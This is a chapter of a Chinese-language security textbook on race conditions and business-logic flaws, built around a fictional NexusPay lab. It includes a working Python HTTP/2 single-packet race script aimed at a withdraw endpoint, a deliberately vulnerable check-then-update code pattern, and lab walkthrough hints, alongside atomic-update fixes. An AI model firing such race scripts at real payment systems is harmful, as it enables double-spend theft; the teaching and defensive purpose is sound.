# 第 12 章：競爭條件、HTTP/2 單封包攻擊、分散式狀態機與商業邏輯漏洞

## 從你已知的出發

為什麼提領程式碼明明包進了 PostgreSQL 的 `BEGIN ... COMMIT` 交易，外面還加了一道 Redis 分散式鎖 `SET lock:withdraw <token> NX PX 3000`，一個只有 `10,000` 分（`$100.00`）餘額的帳戶，還是會在同一毫秒內被成功領走 `20` 筆 `10,000` 分，讓帳本瞬間透支變成 `-190,000` 分（`-$1,900.00`）？

因為「包進交易」不代表「原子扣款」。在 PostgreSQL 預設的 `READ COMMITTED` 等級下，每條普通 `SELECT` 只拿該語句開始時的快照；只要寫成「先 `SELECT` 比大小、再發 `UPDATE` 扣款」，遇上攻擊者用 **HTTP/2 單封包攻擊**（Single-Packet Attack）把 `20` 筆請求塞進同一顆 TCP 封包同時送達（抖動 `< 1 ms`），`20` 筆交易就會在首筆扣款提交前全數讀到 `10,000` 分過關。而且跨越多個請求與外部金流的流程，單筆資料庫交易也管不到狀態跳關與捨入套利。本章就從微秒級的封包同步出發，拆解隔離等級、分散式鎖破口與多步驟狀態機的防線。

---

## 機制與推導

### 攻擊者目標與實質影響

自動化掃描器很會抓 SQL 注入或 XSS 這類有固定語法特徵的漏洞，但面對「帳戶餘額不能變負數」、「一張折扣券只能折抵一次」或「必須先扣款才能出貨」這類商業不變量（Business Invariant），掃描器幾乎完全瞎掉。攻擊者盯上競爭條件與商業邏輯漏洞，圖的都是最直接的利益：

第一是**無本生利的帳務雙花與額度套利**。在 NexusPay 這類即時結算平台上，只要提領、轉帳或領取優惠券的端點存在「先檢查、後寫入」的時間差（TOCTOU），攻擊者就能拿單一帳戶裡僅有的 `10,000` 分（`$100.00`）基準餘額，靠一次單封包併發請求同時領出十幾筆 `10,000` 分，直接把平台的資金池搬空。

第二是**硬生生撞破次數限制與權限門檻**。像簡訊 OTP 驗證碼、重設密碼或免費試用配額，如果後端計數器是用非原子的「先讀目前次數 → 檢查是否小於 `5` 次 → 加一寫回」，一發夾帶數十個併發串流的單封包就能在同一毫秒內全部擠進「小於 `5` 次」的檢查窗，把嚴密的錯誤鎖定機制降級成毫無防備的暴力猜測。

第三則是**充當跨層攻擊鏈的跳板**。商業邏輯跳步常常跟其他技術漏洞串在一起打：例如先利用狀態機競爭，跳過「商戶風控審核中」的限制強行啟用 Webhook 設定，接著馬上打出一發第 11 章的 SSRF 探測內網；或是靠高併發塞入大量重複的交易紀錄，癱瘓後端非同步對帳佇列，掩護真正的資金盜領。

---

### TOCTOU 微秒時間窗與 HTTP/2 單封包攻擊原理

以前大家用多執行緒跑 HTTP/1.1 腳本測競爭條件時，常常覺得「明明有洞，怎麼十次裡才成功一兩次？」

罪魁禍首是 **TCP 與網路傳輸抖動（Jitter）**。就算你在自己電腦上同時開 `20` 個執行緒呼叫 `send()`，每一條獨立的 TCP 連線還是得各自經過作業系統排程、TLS 握手、封包切分與沿路路由器的佇列排隊。等這 `20` 筆請求真正抵達後端（比如 NexusPay 的 Nginx 與 Node.js）時，彼此的到達時間差往往已經被拉開到 `5 ms` 至 `50 ms`。只要第一個請求在 `3 ms` 內做完上鎖或扣款提交，後面慢一步到的 `19` 個請求就會乖乖撞上新狀態而被擋掉。

但 **HTTP/2（RFC 9113）的多工特性（Multiplexing）** 徹底改寫了這個物理限制。在 HTTP/2 裡，單單一條 TLS/TCP 連線就能同時跑好幾個邏輯串流（Stream）；而每筆帶有 JSON 主體的 `POST` 請求，在底層都是由一個 `HEADERS` 訊框加上一或多個 `DATA` 訊框拼成的（沒有主體的請求則直接在 `HEADERS` 掛上 `END_STREAM`）。

PortSwigger 研究員 James Kettle 提出的**單封包攻擊（Single-Packet Attack）**，就是利用這個結構分兩步出招：

1. **預載前段（Pre-warming）**：在同一個 HTTP/2 連線上，先把 `20` 筆請求的 `HEADERS` 訊框、還有**除了最後 `1 byte` 以外**的所有 `DATA` 訊框統統送出去（這時 `END_STREAM` 旗標還沒設成 `1`）。Nginx 與 Node.js 雖然已經收到了整包請求的 99%，但因為 JSON 主體還沒收完，路由處理器就只能乖乖在連線緩衝區裡等最後那一個位元組。
2. **單封包齊發（Single-Packet Release）**：先把客戶端的 `Nagle` 演算法關掉（設定 `TCP_NODELAY`）並在記憶體裡把資料湊齊，接著把這 `20` 個串流各自剩下的**最後 `1 byte` `DATA` 訊框（全部掛上 `END_STREAM=1`）**，一口氣塞進**同一個 TCP 封包**裡送出。要知道一般乙太網路的 TCP MSS 足足有 `1,460 bytes`，而 `20` 個只有 `1 byte` 的極簡 `DATA` 訊框加起來還不到 `300 bytes`，塞進同一顆封包綽綽有餘！

```text
客戶端 (單條 HTTP/2 TCP 連線)                  伺服器端 (Nginx / Node.js)
────────────────────────────────────           ──────────────────────────
Stream 1..20: HEADERS + DATA (缺末位元組) ──▶   暫存於連線緩衝，尚未觸發完整主體 Handler

[示意等待約 100 ms 客戶端排程，讓前段訊框先行送出至伺服器端緩衝]

單一 TCP 封包 (< 300 bytes, TCP_NODELAY):
  [Stream 1 DATA(last 1B, END_STREAM)]
  [Stream 2 DATA(last 1B, END_STREAM)]   ──▶   同封包抵達伺服器端網卡與核心
  ...                                          20 個請求到達抖動 < 1 ms！
  [Stream 20 DATA(last 1B, END_STREAM)]
```

當伺服器網卡收到這顆 TCP 封包並往上層交付時，網路途中的傳輸抖動被完全歸零！照我們全書的系統基準，這 `20` 筆請求在伺服器端的到達時間差會被壓縮到 **`< 1 ms`**。

就算 NexusPay 前面擋著 Nginx（`proxy_read_timeout = 30 s`）再轉給後端 Node.js（`keepAliveTimeout = 5 s`），只要走的是 HTTP/2 或已經預熱好的 Keep-Alive 連線池，這批 `< 1 ms` 同時湧入的請求就會密集撞進 Node.js 的單執行緒事件迴圈。這時只要你的程式碼寫成了下面這種標準的兩段式扣款：

```typescript
// 典型破口：一遇到 await 就把執行權讓給事件迴圈，大開 TOCTOU 時間窗
const account = await db.query('SELECT balance FROM accounts WHERE id = $1', [id]);
if (account.balance >= amount) {
  await externalRiskCheck(id, amount); // 等待非同步 I/O 時，後面 19 筆請求全部趁機插隊進來！
  await db.query('UPDATE accounts SET balance = balance - $1 WHERE id = $2', [amount, id]);
}
```

當第 1 筆請求停在 `await db.query` 或 `await externalRiskCheck` 等待 I/O 回應時，Node.js 事件迴圈馬上切去跑後面已經到齊的第 2 到第 20 筆請求。結果在第一筆交易真正跑完 `UPDATE` 與 `COMMIT` 之前，全部 `20` 筆請求都已經拿到了資料庫快照，開心地讀出還沒扣款的初始餘額 `10,000` 分。

---

### PostgreSQL 隔離等級：`READ COMMITTED` 與 `SERIALIZABLE` 的真實反應

很多工程師會反駁：「我有把 `SELECT` 跟 `UPDATE` 包進同一個 PostgreSQL 交易（`BEGIN` ... `COMMIT`）裡啊！資料庫不是有 ACID 嗎？」

要回答這個問題，得先搞懂 PostgreSQL 16 的 MVCC（多版本併發控制）在不同隔離等級下到底怎麼運作。

#### 1. 預設的 `READ COMMITTED` 為何擋不住雙花？

在 PostgreSQL 預設的 `READ COMMITTED` 等級下，交易裡的**每一條獨立 SQL 語句**，都會各自拿一張「該語句剛開始執行那一刻」的最新已提交快照（Snapshot）。

假設交易 T1 跟 T2 同時跑進了 `BEGIN`：
第一步，T1 跟 T2 幾乎同時執行 `SELECT balance FROM accounts WHERE id = 42`，這時誰都還沒改資料，兩邊都讀到 `10,000` 分，雙雙通過了 JavaScript 裡的 `if (balance >= 10000)` 檢查。
第二步，T1 跟 T2 各自送出無條件扣款語句：`UPDATE accounts SET balance = balance - 10000 WHERE id = 42`。
這時關鍵來了：T1 搶先一步拿到了第 42 列（row）的寫鎖，把餘額改成 `0` 並順利 `COMMIT`。而慢了半毫秒的 T2 在執行 `UPDATE` 時，會被列鎖短暫擋住；等 T1 一提交、釋放列鎖的那一瞬間，PostgreSQL 的 `READ COMMITTED` 規則是「**重新讀取該列最新已提交的版本**（也就是 `0`），**然後直接套用** `SET balance = balance - 10000`」！

看到了嗎？原本寫在 JavaScript 裡的 `if (balance >= 10000)` 早在幾毫秒前就跑完了，根本不會重跑一次；而資料庫的 `UPDATE` 語句裡又沒有帶上 `WHERE balance >= 10000` 的條件，加上資料表若忘了設非負 `CHECK` 約束，T2 就會高高興興地從 `0` 再扣掉 `10,000`，把帳本餘額扣成 `-10,000` 分。

#### 2. 調高到 `REPEATABLE READ` 與 `SERIALIZABLE` 會怎樣？

如果把交易隔離等級調高到 **`REPEATABLE READ`**，整筆交易從頭到尾都會共用「交易內第一條非交易控制 SQL 語句」開始時拍下的那一張快照。當 T1 更新完第 42 列並提交後，任何在 T1 提交前就已經拍好舊快照、隨後也想 `UPDATE` 同一列的併發交易（T2..T20），在列鎖釋放後會立刻被 PostgreSQL 抓出衝突，直接拋出 `ERROR: could not serialize access due to concurrent update`（SQLSTATE `40001`）並強制回滾。這樣確實能擋住針對「同一列」的覆寫雙花。

但 `REPEATABLE READ` 還是有一個死角，叫做**寫偏斜（Write Skew）**。
想像一個跨多列的業務規則：「每位商戶名下有主帳戶 A 跟副帳戶 B，規定 A + B 的總餘額不能小於 `0`」。現在帳戶 A 跟 B 各有 `5,000` 分（總和 `10,000` 分）；攻擊者用單封包同時打兩筆請求：T1 要從帳戶 A 領走 `10,000` 分，T2 要從帳戶 B 領走 `10,000` 分。
在 `REPEATABLE READ` 下，T1 與 T2 先各自 `SELECT` 讀出 A 和 B 的餘額，算出總和都是 `10,000 >= 10,000` 通過檢查；接著 T1 只執行 `UPDATE` 修改 A 列（改成 `-5,000`），T2 只執行 `UPDATE` 修改 B 列（也改成 `-5,000`）。因為兩筆交易**修改的是不同列**，列鎖完全不會撞在一起，`REPEATABLE READ` 就會讓兩筆交易雙雙成功提交，結果 A + B 的總和變成 `-10,000` 分！

要擋住這種「讀同一批資料、卻各自改不同列」的寫偏斜，只有兩條路：一是把隔離等級升到最高的 **`SERIALIZABLE`**（PostgreSQL 會透過 SSI 可串行化快照隔離技術，追蹤讀寫反相依的 `rw-antidependency` 結構，主動拿 `40001` 砍掉其中一筆交易）；二是在 `READ COMMITTED` 下先用 `SELECT ... FOR UPDATE` 鎖住共用的父列（比如商戶主表那一列）再來讀子帳戶，或是在 `REPEATABLE READ` 下強迫所有子帳戶異動都順手對共用父列做一次版本號遞增更新，人為製造同一列的寫入衝突。

下面我們用 Worked Example，把單封包 `20` 併發請求打在 NexusPay 預設 `READ COMMITTED` 非原子扣款上的完整時間軸與財務損失算清楚：

```text
=== Worked Example: NexusPay 單封包 20 併發提領雙花與透支推導 ===

初始狀態與系統常數:
  account_id = 42, 初始餘額 B_0 = 10,000 分 ($100.00)
  單次提領上限 W_max = 10,000 分 ($100.00)
  HTTP/2 單封包併發數 N = 20 筆請求，伺服器端到達抖動 < 1 ms
  預期安全不變量: 累積成功出金總和 <= 10,000 分，且最終資料庫餘額 balance >= 0

時間軸 (t0 ~ t4, 到達時間窗 < 1 ms，各時間點與交易順序為示意模型):
  t0 (0.00 ms): 20 個 HTTP/2 DATA(END_STREAM=1) 訊框於同一顆 TCP 封包抵達 Nginx -> Node.js
  t1 (0.40 ms): T1..T20 各自啟動 BEGIN (預設 READ COMMITTED)
  t2 (0.80 ms): T1..T20 併發執行 SELECT balance FROM accounts WHERE id = 42
                -> 此時尚未有任何 UPDATE 提交，T1..T20 全數讀到 balance = 10,000
                -> 應用層檢查 10,000 >= 10,000 全數通過 (20/20 passed)
  t3 (1.50 ms): T1 率先執行無條件扣款 UPDATE accounts SET balance = balance - 10000 WHERE id = 42
                -> balance 暫寫為 0，T1 呼叫出金閘道並 COMMIT
                -> T2..T20 在 id = 42 同一列的寫鎖上排隊等待
  t4 (2.00 ms ~ 12.00 ms):
                -> T1 提交釋放列鎖後，T2 喚醒並重讀最新已提交列 (balance = 0)，套用 balance - 10000
                -> balance 變為 -10,000，T2 完成出金並 COMMIT
                -> T3..T20 依序喚醒並重讀扣減，一路推進至 T20

最終帳本與財務損失結算:
  成功出金次數 = 20 次
  單次出金金額 = 10,000 分 ($100.00)
  總出金金額   = 20 × 10,000 = 200,000 分 ($2,000.00)
  帳戶最終餘額 = 10,000 - (20 × 10,000) = -190,000 分 (-$1,900.00)
  淨超額盜領   = 200,000 - 10,000 = 190,000 分 ($1,900.00，相當於原始餘額的 19 倍透支)
```

更可怕的是，如果後端把順序寫成「先呼叫外部銀行 API 把錢匯出去（而且沒傳跟帳本綁死的唯一冪等憑證），等銀行回傳成功才回頭執行資料庫 `UPDATE`」，那就算你在資料庫設了 `CHECK (balance >= 0)` 擋下了後面 19 筆 `UPDATE` 並觸發回滾，外部銀行那邊只要已經收單匯款，最多還是有 `20` 筆真金白銀飛了出去，資料庫回滾也追不回來。

---

### 為什麼加了 Redis 分散式鎖（`SET NX`）還是會爆？

為了保護這種「先打外部金流 API、再回來寫資料庫」的跨系統流程，很多團隊會搬出 Redis 分散式鎖：進函數第一件事先跑 `SET lock:withdraw:42 <token> NX PX 3000`。這條指令本身雖然是原子的，但在真實高併發環境裡卻常栽在四個大坑上：

第一個坑是**鎖錯了鍵（Key Mismatch）**。有些工程師把鎖的鍵設成 `lock:withdraw:${req.headers['idempotency-key']}` 而不是鎖在帳戶 `lock:account:${accountId}` 上。攻擊者發單封包時只要順手用迴圈塞 `20` 個不同的 UUID 當冪等鍵，這 `20` 把鎖就完全不互卡，形同虛設。

第二個坑是**鎖過期加上無腦 `DEL` 誤刪別人的鎖**。假設請求 A 搶到了鎖（限時 `3,000 ms`），結果因為外部銀行 API 剛好抖了一下或是 Node.js 發生垃圾回收停頓（GC pause），卡了 `3,500 ms` 還沒跑完。到了第 `3,000 ms` 時，Redis 自動把鎖釋放，請求 B 馬上拿走新鎖進來執行；結果第 `3,500 ms` 請求 A 終於跑完跳進 `finally` 區塊，順手執行了一句無條件的 `DEL lock:withdraw:42`——這下可好，A 把 B 正在握著的鎖給刪了，外面的請求 C 立刻長驅直入！

第三個坑是**把檢查與刪鎖拆成兩步**。就算知道刪鎖前要先核對 `<token>` 是不是自己當初塞進去的那個，如果在應用程式裡先跑 `GET` 比對、再發 `DEL` 刪除，兩條指令之間照樣有 TOCTOU 時間差，必須改用 Redis Lua 腳本把「比對 token 與刪除」包成單一原子動作。

第四個也是最根本的坑：**Redis 主從非同步複製與缺少 Fencing Token（柵欄憑證）**。如果 Redis 主節點剛對請求 A 回傳 `OK` 發出鎖就瞬間當機，這筆鎖還沒同步到從節點，從節點一升上來就會把同一把鎖再發給請求 B。說到底，Redis 分散式鎖只是一張君子協定的「協調提示（Advisory Lock）」；如果底層的 PostgreSQL 資料表本身沒有檢查遞增的 **Fencing Token**（比如 `WHERE version < $fencing_token`）或靠自身的列鎖與條件更新把關，那個卡頓後醒來的舊請求 A 照樣能把過期的髒資料寫進資料庫。

---

### 多步驟工作流跳步與數值精度套利

除了拼手速的微秒級併發，商業邏輯漏洞還有一大片藏在「跨請求的狀態機」與「算術細節」裡，完全不需要高併發就能得手：

先看**多步驟工作流跳步（Workflow Step Skipping）**。
很多電商或支付系統把結帳拆成四步：`Step 1 建立訂單` → `Step 2 套用折扣算總額` → `Step 3 導向金流付款` → `Step 4 確認完成並出貨`。如果後端在 `POST /v1/orders/:id/confirm`（第 4 步）裡，只看前端有沒有傳來成功旗標或只看 Session 裡的 `currentStep`，卻沒有回資料庫核對「這張訂單的狀態是不是真的已經變成 `PAID`、而且付款金額與當前訂單明細版本完全吻合」，攻擊者只要建完訂單就直接打第 4 步的確認 API，一毛錢不付就能完成結帳。
還有一種常見的組合技是**在確認頁與付款回呼之間偷換購物車**：攻擊者先放一個 `$1` 的小東西進購物車，走到付款頁拿到金流簽章；在按下付款並收到回呼的前一刻，從另一個視窗把 `$999` 的高價商品加進同一個購物車。如果結帳服務在收到 `$1` 的付款成功通知時，直接撈「購物車目前的最新內容」去轉成出貨單，攻擊者就用 `$1` 買走了 `$1,000` 的商品。

再看**數值邊界與精度捨入套利（Precision & Rounding Arbitrage）**。
除了第 1 章提過的負數金額與負數商品數量（`quantity: -5` 讓扣款變加款），最隱蔽的就是**最小單位截斷（Rounding to Zero）**。
NexusPay 的帳本最小單位是 `1` 分（`$0.01`）。假設跨幣別結算或提領手續費是按 `0.5%` 計算，而工程師寫了 `fee = Math.floor(amount * 0.005)` 無條件捨去小數點。攻擊者原本要領 `10,000` 分（手續費 `50` 分），現在他寫個腳本拆成 `100` 筆、每筆只領 `100` 分的小額交易：因為 `100 * 0.005 = 0.5` 分，經過 `Math.floor(0.5)` 瞬間變成 `0` 分！拆單之後，手續費被完全歸零。同理，如果雙向換匯 API 沒收買賣價差與手續費，又在某個匯率區間用了不對稱的四捨五入，攻擊者只要寫個高頻小額換匯迴圈，就能靠每次多出來的 `1` 分捨入差額無中生有洗出真錢。

---

## 故障模式與防禦

對付競爭條件與商業邏輯破口，千萬別靠「在 JavaScript 裡多加幾個 `if` 檢查」或是祈禱請求不會同時進來。真正可靠的防線，必須直接焊死在**資料庫的原子狀態轉移**與**唯一約束**上。

### 四大常見故障模式與根治防線對照

| 常見破口 | 一戳就破的錯誤防禦 | 真正能鎖死不變量的根治方案 | 適用場景 |
|---|---|---|---|
| **單列餘額扣款 TOCTOU** | 先 `SELECT` 讀出餘額在程式裡比大小，再發無條件的 `UPDATE` | **單條原子條件更新（CAS）**：`UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1 RETURNING balance`，嚴格以 `rowCount === 1` 且交易成功 `COMMIT` 作為扣款成功的唯一依據 | 單一資料表單列的數值增減與額度扣減 |
| **跨多列的複雜業務規則** | 只開預設的 `READ COMMITTED` 交易，或是開了 `REPEATABLE READ` 卻沒防寫偏斜 | **悲觀列鎖 `SELECT ... FOR UPDATE`**（跨多列時務必按固定 ID 順序加鎖以防死鎖），或升級至 **`SERIALIZABLE`** 並搭配 `40001` 自動重試機制 | 雙帳戶轉帳、主副帳戶合併額度、庫存與優惠券同時扣減 |
| **跨服務重送與雙重扣款** | 沒設計冪等機制，或是「先 `SELECT` 看冪等鍵存不存在、再 `INSERT`」 | **冪等鍵（Idempotency-Key）+ 資料庫 `UNIQUE` 約束**：在同一個交易裡先跑 `INSERT INTO idempotency_keys ... ON CONFLICT DO NOTHING`，只有拿到 `rowCount === 1` 的那筆請求才准往下執行業務 | 金流請款、提領出金、外部 Webhook 接收 |
| **外部慢速 API 臨界區** | 只用 Redis `SET NX` 搭配 `finally` 無條件 `DEL` | **先在資料庫預扣款（記為 `PENDING` 狀態）再打外部 API**；若非用 Redis 鎖不可，必須用 **Lua 腳本核對 token 釋放** + 儲存層 **Fencing Token** + 外部端點唯一冪等憑證與定期對帳 | 必須先呼叫外部銀行或第三方慢速 API 的流程 |
| **多步驟狀態機跳關** | 只在前端把按鈕藏起來，或只看 Session 裡的 `step` 變數 | **資料庫顯式狀態機條件轉移**：`UPDATE orders SET status = 'PAID' WHERE id = $1 AND status = 'PENDING_PAYMENT' AND cart_version = $2`，強制核對前置狀態與明細版本號 | 多步驟電商結帳、商戶 KYC 審核、密碼重設流程 |
| **數值精度與正負號套利** | 用 `number` / `float` 浮點數存金額，或手續費無條件捨去 | **全帳本一律用整數分（Integer Cents）**、入口嚴格檢查 `Number.isSafeInteger(amount) && amount > 0`、手續費與換匯捨入方向一律朝「對平台有利端」進位（如 `Math.ceil` 或設最低手續費 `1` 分） | 計費、多幣別換匯、手續費結算與分潤 |

### 關鍵修補範例：PostgreSQL 原子條件更新 + 唯一冪等鍵

把上面這套原則落實到 NexusPay 的提領核心裡，我們連 Redis 鎖都不用靠，直接用一個 PostgreSQL 交易把「冪等鍵搶佔」與「帶條件的原子扣款」綁在一起（正式生產環境在此基礎上，還會把請求參數的雜湊值與回傳結果存進冪等表以便同鍵重送時回放，並將外部出金狀態持久化留作對帳）：

```typescript
async function withdrawAtomic(
  pool: Pool,
  accountId: number,
  amountCents: number,
  idempotencyKey: string
) {
  // 1. 入口先鎖死正整數與單次提領上限 10,000 分 ($100.00)
  if (!Number.isSafeInteger(amountCents) || amountCents <= 0 || amountCents > 10_000) {
    throw new Error('INVALID_AMOUNT');
  }

  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    // 2. 靠資料庫 UNIQUE 約束原子搶佔冪等鍵，重複請求在此直接擋掉
    const idemRes = await client.query(
      `INSERT INTO withdraw_idempotency (account_id, idem_key, status)
       VALUES ($1, $2, 'PROCESSING')
       ON CONFLICT (account_id, idem_key) DO NOTHING
       RETURNING id`,
      [accountId, idempotencyKey]
    );
    if (idemRes.rowCount === 0) {
      await client.query('ROLLBACK');
      throw new Error('DUPLICATE_REQUEST');
    }

    // 3. 單條原子條件更新：PostgreSQL 會在拿著列鎖的當下，用最新已提交的 balance 評估 >= $1
    const updateRes = await client.query(
      `UPDATE accounts
       SET balance = balance - $1
       WHERE id = $2 AND balance >= $1
       RETURNING balance`,
      [amountCents, accountId]
    );
    if (updateRes.rowCount === 0) {
      await client.query('ROLLBACK');
      throw new Error('INSUFFICIENT_FUNDS');
    }

    await client.query('COMMIT');
    return { newBalance: updateRes.rows[0].balance };
  } catch (err) {
    await client.query('ROLLBACK').catch(() => {});
    throw err;
  } finally {
    client.release();
  }
}
```

看看這段程式碼怎麼化解 `< 1 ms` 的單封包 `20` 併發攻擊：
- 如果攻擊者送來的 `20` 個串流帶的是**同一個 `idempotencyKey`**：只有搶到頭香的第 1 筆交易能成功插入 `withdraw_idempotency` 拿到 `rowCount === 1`；剩下 `19` 筆在唯一索引鎖等待結束後，全都會因為 `ON CONFLICT DO NOTHING` 拿到 `rowCount === 0`，直接丟出 `DUPLICATE_REQUEST` 回滾收場。
- 如果攻擊者很聰明，幫 `20` 個串流換了 `20` **個不同的** `idempotencyKey`：雖然大家都能通過第一步的冪等表插入，但在第二步撞上 `UPDATE accounts ... WHERE id = $2 AND balance >= $1` 時，PostgreSQL 的列鎖會強迫這 `20` 筆交易乖乖排成一列。第 1 筆交易把餘額從 `10,000` 扣成 `0` 並提交後，第 2 到第 20 筆交易依序被喚醒重讀最新已提交列時，看到的餘額已經是 `0`，根本不滿足 `AND balance >= 10000`！於是後面 `19` 筆全部拿到 `rowCount === 0` 並觸發 `ROLLBACK`（連同剛剛插進冪等表的那一列也一起回滾撤銷），帳本餘額穩穩停在 `0` 分，一分錢都多領不走。

---

## 動手做

- **難度**：進階
- **預估時間**：45 分鐘

現在我們用 Python 的 `h2` 與原生 `socket` 函式庫，親手打造一把 HTTP/2 單封包攻擊槍，直接打向本地的 NexusPay 靶機（初始測試餘額 `10,000` 分），親眼見證 `< 1 ms` 的併發威力，接著再套用上面的原子交易修補把它徹底封死。

### 步驟 1：撰寫 HTTP/2 單封包攻擊腳本（Python `h2` + `socket`）

確認本地 NexusPay 靶機已開啟支援 HTTP/2（ALPN `h2`）的 TLS 端點（預設連接埠 `8443`），並且測試帳戶餘額已重置為 `10,000` 分。接著建立 `single_packet_exploit.py`，重點看它怎麼先送出前段主體 `BODY[:-1]`、最後再把 `20` 個串流的最後 `1 byte` 打包進同一次 `sendall()`：

```python
import socket, ssl, time
import h2.connection, h2.config

HOST = "127.0.0.1"
PORT = 8443
PATH = "/v1/withdraw"
TOKEN = "Bearer <NEXUSPAY_JWT>"
BODY = b'{"amount":10000}'

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

raw_sock = socket.create_connection((HOST, PORT))
# 關鍵設定：關閉 Nagle 演算法，確保最後一包 sendall 立刻送出不延遲
raw_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
tls_sock = ctx.wrap_socket(raw_sock, server_hostname=HOST)

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_connection()
tls_sock.sendall(conn.data_to_send())

stream_ids = []
headers = [
    (":method", "POST"),
    (":path", PATH),
    (":authority", f"{HOST}:{PORT}"),
    (":scheme", "https"),
    ("authorization", TOKEN),
    ("content-type", "application/json"),
    ("content-length", str(len(BODY))),
]

# 第一階段：預載 20 個串流，送出 HEADERS 與除了最後 1 byte 以外的 BODY[:-1]
for i in range(20):
    sid = conn.get_next_available_stream_id()
    stream_ids.append(sid)
    req_headers = headers + [("idempotency-key", f"idem-{i}")]
    conn.send_headers(sid, req_headers)
    conn.send_data(sid, BODY[:-1], end_stream=False)

tls_sock.sendall(conn.data_to_send())
time.sleep(0.1)  # 示意等待約 100 ms，讓前段訊框先抵達伺服器連線緩衝區待命

# 第二階段：單封包齊發！把 20 個串流的最後 1 byte (帶 END_STREAM=True) 塞進同一個緩衝區一次送出
for sid in stream_ids:
    conn.send_data(sid, BODY[-1:], end_stream=True)

final_packet = conn.data_to_send()
print(f"[*] Releasing {len(stream_ids)} streams in single write ({len(final_packet)} bytes)")
tls_sock.sendall(final_packet)
```

### 步驟 2：實測雙花透支與修補驗證

1. **打穿未修補端點**：在腳本尾端補上接收回應訊框的迴圈並執行它，觀察未修補的 NexusPay 吐出多少筆 `200 OK`，再查資料庫看帳戶餘額被扣到了負幾萬分。
2. **套用原子修補並重測**：把後端提領處理器換成上一節的 `withdrawAtomic`（並把 `DUPLICATE_REQUEST` 轉成 HTTP `409 Conflict`、`INSUFFICIENT_FUNDS` 轉成 `400 Bad Request`），重置餘額回 `10,000` 分後再跑一次同一支單封包腳本，確認是否只剩 `1` 筆成功、其餘 `19` 筆全數被擋下。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地實驗跑通後，請到 **PortSwigger Web Security Academy** 挑戰下面兩組線上實驗室：

- **Race conditions 模組**（至少完成 *Limit overrun race conditions* 與 *Multi-endpoint race conditions*）：實際操作 Burp Repeater 的 `Send group in parallel (single-packet attack)` 功能。如果打了好幾次都只成功一筆，記得檢查兩個地方：一是目標連線有沒有真的走 HTTP/2（HTTP/1.1 無法使用單封包同步），二是在正式開槍前有沒有先發一筆無害請求做連線預熱（Warm-up），免得第一次建立連線與載入快取的延遲把時間窗拉開了。
- **Business logic vulnerabilities 模組**（至少完成 *Insufficient workflow validation* 與 *High-level logic vulnerability*）：放下手邊的自動掃描器，練習拿紙筆把結帳與折扣端點每一步的「前置狀態假設」畫出來，親手測試負數商品數量、跳過付款確認步驟，以及在兩個步驟之間偷改購物車參數。

---

### 參考解答

1. **未修補前的雙花實測結果**：
   跑完單封包腳本後，你會在終端機看到一整排的 `200 OK`（實際成功筆數取決於本地資料庫連線池大小，以及有多少筆 `SELECT` 快照趕在第一筆 `COMMIT` 之前拍完；例如當剛好有 `10` 筆請求在首筆扣款提交前讀到 `10,000` 分並全數完成出金時，總出金就高達 `100,000` 分、帳本透支 `-90,000` 分，各時間點與成功筆數為示意模型）。如果你測試時發現永遠只成功 `1` 筆，最常見的原因不是 Nginx 忘了開 `http2`，就是上一輪測完忘了把測試帳號的初始餘額重置回 `10,000` 分。
2. **套用 `withdrawAtomic` 修補後的驗證結果**：
   換上包含 `INSERT ... ON CONFLICT DO NOTHING` 與 `UPDATE accounts ... WHERE id = $2 AND balance >= $1` 的原子交易寫法後，不管你重跑幾次單封包腳本，資料庫都能保證最多只有 `1` 筆扣款能提交成功。當 `20` 個串流正常跑完回應時，畫面會穩定出現 **`1` 筆 `200 OK`（`newBalance: 0`）**，剩下的 **`19` 筆則全部回傳 `400 Bad Request`（不同冪等鍵但撞上列鎖後發現餘額已為 `0`）或 `409 Conflict`（使用相同冪等鍵時）**，資料庫裡的帳戶餘額穩穩停在 `0` 分，完全沒有透支。
3. **PortSwigger 靶場破關要領**：
   - 打 *Multi-endpoint race conditions* 時，秘訣是看出「驗證付款金額」跟「往購物車加商品」這兩支不同 API 其實在後端讀寫同一個 Session 購物車。只要把「確認付款」跟「加入高價商品」兩筆請求放進同一個 HTTP/2 單封包群組裡齊發，多試幾次就能卡進「剛檢查完低價總額、卻拿加完高價商品後的購物車去出貨」的黃金交叉點。
   - 打 *Insufficient workflow validation* 時，先乖乖買一個買得起的便宜商品走完正常結帳，在 Burp 裡把最後一步的 `POST /cart/checkout/confirm` 攔下來；接著把昂貴商品放進新購物車，直接重送剛剛攔下來的那筆 `confirm` 請求，就能驗證後端是不是只檢查了「有沒有登入」卻忘了檢查「這車商品付過錢了沒」。

---

## 自我檢核

- **難度**：進階
- **預估時間**：20 分鐘

不看前面的解答，試著分析以下四個真實架構審查時常遇到的問題：

1. 很多寫 Node.js 的工程師會說：「JavaScript 是單執行緒跑的，根本不會像 C++ 或 Java 那樣有兩個執行緒同時改同一個記憶體變數的 Data Race，所以我們的 Node.js 扣款 API 不可能發生競爭條件！」請指出這句話錯在哪裡。
2. 某支付團隊沒有改動「先 `SELECT` 讀餘額、再 `UPDATE` 扣款」的兩段式程式碼，而是直接把 PostgreSQL 的交易隔離等級從 `READ COMMITTED` 調高成 `REPEATABLE READ`。請問這樣面對單一帳戶的 `20` 筆單封包併發提領時會發生什麼事？這招能不能解決所有的帳務競爭條件？
3. 為了保護提領流程，某工程師在進入業務邏輯前先對 Redis 執行 `SET lock:acc:42 <uuid> NX PX 5000`，並在 `try ... finally` 的 `finally` 區塊裡執行 `DEL lock:acc:42`。請指出這套鎖設計在遇到下游延遲與單封包併發時，會爆出哪兩個致命破口？
4. 如果今天架構師規定「不准用 Redis 分散式鎖，只准靠 PostgreSQL 資料庫本身與 API 介面規格來擋住重複扣款與負數透支」，你設計出來的提領 API 與資料庫契約必須包含哪三個核心要素？

---

### 參考解答

1. **為什麼單執行緒的 Node.js 照樣有嚴重的 TOCTOU 雙花**：
